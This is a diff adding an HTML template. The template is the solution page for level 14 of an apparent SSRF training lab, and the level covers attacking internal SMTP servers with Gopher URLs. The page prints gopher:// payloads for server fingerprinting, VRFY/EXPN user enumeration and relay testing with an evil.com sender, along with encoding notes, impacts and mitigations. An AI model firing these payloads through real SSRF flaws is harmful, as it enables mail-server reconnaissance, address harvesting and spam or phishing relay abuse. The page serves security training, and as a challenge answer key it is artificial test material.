@@ -1,0 +1,111 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 14 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 14 Solution: SSRF via SMTP Protocol</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates using Gopher protocol to exploit SMTP servers via SSRF, enabling email server reconnaissance and potential data exfiltration.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand SMTP protocol:</strong> SMTP uses simple text-based commands</li>
+                    <li><strong>Learn Gopher protocol:</strong> Gopher can send arbitrary TCP data</li>
+                    <li><strong>Craft Gopher SMTP URL:</strong> Encode SMTP commands in Gopher URL</li>
+                    <li><strong>Target internal SMTP servers:</strong> Point to internal mail servers (port 25/587)</li>
+                </ol>
+
+                <h4>Gopher SMTP Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic SMTP server info
+gopher://127.0.0.1:25/_EHLO%20attacker.com
+
+# SMTP user enumeration
+gopher://localhost:25/_VRFY%20admin
+gopher://localhost:25/_VRFY%20root
+gopher://localhost:25/_EXPN%20admin
+
+# SMTP relay testing
+gopher://internal.mail.local:25/_MAIL%20FROM:%3Cattacker@evil.com%3E%0D%0ARCPT%20TO:%3Cvictim@company.com%3E
+
+# Advanced SMTP commands
+gopher://127.0.0.1:587/_AUTH%20PLAIN%0D%0AEHLO%20test%0D%0AMAIL%20FROM:%3Ctest@test.com%3E
+
+# SMTP server fingerprinting
+gopher://internal.smtp.local:25/_HELP%0D%0AQUIT</code></pre>
+                    </div>
+                </div>
+
+                <h4>SMTP Command Reference:</h4>
+                <ul>
+                    <li><strong>EHLO/HELO:</strong> Server greeting and capability discovery</li>
+                    <li><strong>VRFY:</strong> Verify if email address exists</li>
+                    <li><strong>EXPN:</strong> Expand mailing list</li>
+                    <li><strong>MAIL FROM:</strong> Specify sender address</li>
+                    <li><strong>RCPT TO:</strong> Specify recipient address</li>
+                    <li><strong>DATA:</strong> Send email content</li>
+                    <li><strong>HELP:</strong> Get server help information</li>
+                </ul>
+
+                <h4>Gopher URL Encoding:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># URL encoding for SMTP commands
+%0D%0A = \r\n (CRLF)
+%20 = space
+%3C = <
+%3E = >
+%40 = @
+
+# Example: VRFY admin command
+Original: VRFY admin\r\n
+Encoded: VRFY%20admin%0D%0A
+Gopher URL: gopher://target:25/_VRFY%20admin%0D%0A</code></pre>
+                    </div>
+                </div>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>Gopher URL generators:</strong> Automate URL encoding</li>
+                    <li><strong>Burp Suite:</strong> Manual request crafting</li>
+                    <li><strong>SMTP clients:</strong> Understanding SMTP protocol</li>
+                    <li><strong>URL encoders:</strong> Proper character encoding</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Internal SMTP server enumeration</li>
+                    <li>Email address validation and harvesting</li>
+                    <li>SMTP relay abuse for spam/phishing</li>
+                    <li>Internal email system reconnaissance</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Block Gopher protocol in HTTP clients</li>
+                    <li>Implement strict protocol allowlists</li>
+                    <li>Secure SMTP servers with authentication</li>
+                    <li>Disable VRFY and EXPN commands</li>
+                </ul>
+
+                <div class="alert alert-warning">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Advanced Technique</h5>
+                    <p class="mb-0">Gopher protocol SMTP exploitation can lead to serious email security breaches. Always test responsibly and implement proper protections.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level14" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level15" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
